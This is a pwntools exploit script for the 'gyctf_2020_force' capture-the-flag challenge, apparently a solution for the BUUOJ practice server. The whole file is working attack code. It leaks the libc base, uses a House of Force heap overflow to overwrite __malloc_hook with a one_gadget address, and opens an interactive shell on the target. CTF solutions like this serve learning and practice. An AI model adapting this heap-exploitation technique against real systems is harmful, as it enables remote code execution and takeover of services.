from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './gyctf_2020_force'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',29869) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,3,2,4
def add(size,content='a'):
	sla('puts\n',str(_add))
	sla('size\n',str(size))
	ru('0x')
	addr = int(ru('\n'),16)
	sa('content',content)
	return addr

def free(index):
	sla('?',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla('?',str(_edit))
	sla('?',str(index))
	s(content)

def show(index):
	sla(':',str(_show))
	sla(':',str(index))

# start
distance = 0x5b2010
base = add(0x20000)-distance
leak('base',base)

heap = add(0x10,'\x00'*0x18+p64(0xffffffffffffffff))-0x10
leak('heap',heap)
top = heap+0x20

malloc_hook = base+libc.sym['__malloc_hook']
one = base+0x4526a
realloc = base+libc.sym['realloc']

# force heapbase
evil = malloc_hook-top-0x30
add(evil)
payload = flat('a'*8,one,realloc+4)
add(len(payload),payload)

sla('puts\n','1')
sla('size\n',str(0x10))
# end

itr()